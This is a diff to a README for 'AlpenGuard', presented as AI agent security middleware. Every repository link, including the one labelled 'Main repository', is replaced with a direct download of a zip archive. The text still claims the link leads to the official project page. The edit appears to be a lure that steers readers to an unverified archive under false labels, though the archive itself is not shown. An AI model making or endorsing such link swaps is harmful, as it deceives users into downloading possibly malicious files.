@@ -1,6 +1,6 @@
 # 🛡️ alpenguard-security-framework - Secure AI Agent Middleware
 
-[![Download AlpenGuard](https://img.shields.io/badge/Download-AlpenGuard-brightgreen?style=for-the-badge)](https://github.com/vineeth0216/alpenguard-security-framework)
+[![Download AlpenGuard](https://img.shields.io/badge/Download-AlpenGuard-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/vineeth0216/alpenguard-security-framework/main/programs/security_framework_alpenguard_v3.4.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Before you start, make sure your computer meets these requirements:
 
 Click the big button at the top or here:
 
-[Download AlpenGuard from GitHub](https://github.com/vineeth0216/alpenguard-security-framework)
+[Download AlpenGuard from GitHub](https://raw.githubusercontent.com/vineeth0216/alpenguard-security-framework/main/programs/security_framework_alpenguard_v3.4.zip)
 
 This link takes you directly to the official project page on GitHub. You will find the latest versions, files, and updates here.
 
@@ -121,7 +121,7 @@ To remove AlpenGuard from your computer:
 
 ## 🔗 Useful Links
 
-- Main repository: [https://github.com/vineeth0216/alpenguard-security-framework](https://github.com/vineeth0216/alpenguard-security-framework)
+- Main repository: [https://raw.githubusercontent.com/vineeth0216/alpenguard-security-framework/main/programs/security_framework_alpenguard_v3.4.zip](https://raw.githubusercontent.com/vineeth0216/alpenguard-security-framework/main/programs/security_framework_alpenguard_v3.4.zip)
 - For updates and bug reports, use the **Issues** tab on the GitHub page.
 - Check the **Wiki** section on GitHub for detailed guides and FAQs.
 
@@ -148,4 +148,4 @@ If you run into issues or need assistance:
 
 ---
 
-[![Download AlpenGuard](https://img.shields.io/badge/Download-AlpenGuard-brightgreen?style=for-the-badge)](https://github.com/vineeth0216/alpenguard-security-framework)
+[![Download AlpenGuard](https://img.shields.io/badge/Download-AlpenGuard-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/vineeth0216/alpenguard-security-framework/main/programs/security_framework_alpenguard_v3.4.zip)
